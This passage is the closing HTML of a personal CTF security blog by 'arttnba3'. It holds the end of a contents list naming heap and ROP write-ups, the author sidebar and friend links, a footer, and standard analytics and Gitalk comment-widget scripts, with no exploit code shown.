class="nav-number">50.</span> <span class="nav-text">0x???.0ctf_2017_babyheap - Unsorted bin leak + Fastbin Attack + one_gadget</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x-mrctf2020-easyrop-ret2text"><span class="nav-number">51.</span> <span class="nav-text">0x???.mrctf2020_easyrop - ret2text</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="arttnba3"
      src="/images/avatar.png">
  <p class="site-author-name" itemprop="name">arttnba3</p>
  <div class="site-description" itemprop="description">- åšäº†å…³äºä½ çš„æ¢¦ï¼Œæ‰€ä»¥ä¸æ„¿é†’æ¥å‘¢ -</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">22</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">47</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/arttnba3" title="GitHub â†’ https:&#x2F;&#x2F;github.com&#x2F;arttnba3" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:1543127579@qq.com" title="E-Mail â†’ mailto:1543127579@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://weibo.com/u/7518681149" title="Weibo â†’ https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;7518681149" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://twitter.com/arttnba3" title="Twitter â†’ https:&#x2F;&#x2F;twitter.com&#x2F;arttnba3" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
      </span>
  </div>


  <div class="links-of-blogroll motion-element">
    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
      Friends' Links
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="https://www.wootec.top/" title="https:&#x2F;&#x2F;www.wootec.top" rel="noopener" target="_blank">Reverier</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://luoq1an.github.io/" title="https:&#x2F;&#x2F;luoq1an.github.io" rel="noopener" target="_blank">luoqian</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://ll1ng.github.io/" title="https:&#x2F;&#x2F;ll1ng.github.io" rel="noopener" target="_blank">ling</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://shal10w.github.io/" title="https:&#x2F;&#x2F;shal10w.github.io" rel="noopener" target="_blank">shallow</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://eqqie.cn/" title="https:&#x2F;&#x2F;eqqie.cn" rel="noopener" target="_blank">eqqie</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://cor1e.cn/" title="https:&#x2F;&#x2F;cor1e.cn" rel="noopener" target="_blank">cor1e</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://yunq1ao.com/" title="https:&#x2F;&#x2F;yunq1ao.com" rel="noopener" target="_blank">yunqiao</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://mercer5.github.io/" title="https:&#x2F;&#x2F;mercer5.github.io" rel="noopener" target="_blank">mercer</a>
        </li>
    </ul>
  </div>

      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">arttnba3</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  
  <script>
    (function(){
      var canonicalURL, curProtocol;
      //Get the <link> tag
      var x=document.getElementsByTagName("link");
		//Find the last canonical URL
		if(x.length > 0){
			for (i=0;i<x.length;i++){
				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
					canonicalURL=x[i].href;
				}
			}
		}
    //Get protocol
	    if (!canonicalURL){
	    	curProtocol = window.location.protocol.split(':')[0];
	    }
	    else{
	    	curProtocol = canonicalURL.split(':')[0];
	    }
      //Get current URL if the canonical URL does not exist
	    if (!canonicalURL) canonicalURL = window.location.href;
	    //Assign script content. Replace current URL with the canonical URL
      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
  </script>















  

  

<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">

<script>
NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
    var gitalk = new Gitalk({
      clientID    : 'a040036b8e5ab6a9838d',
      clientSecret: '7b9006697fe7a78e56f22a025caf2deb03e14ea8',
      repo        : 'BlogComment',
      owner       : 'SakuraiHimeki',
      admin       : ['SakuraiHimeki'],
      id          : '034d11c82b4b36b0887d6a839e39c077',
        language: '',
      distractionFreeMode: false
    });
    gitalk.render('gitalk-container');
  }, window.Gitalk);
});
</script>

</body>
</html>
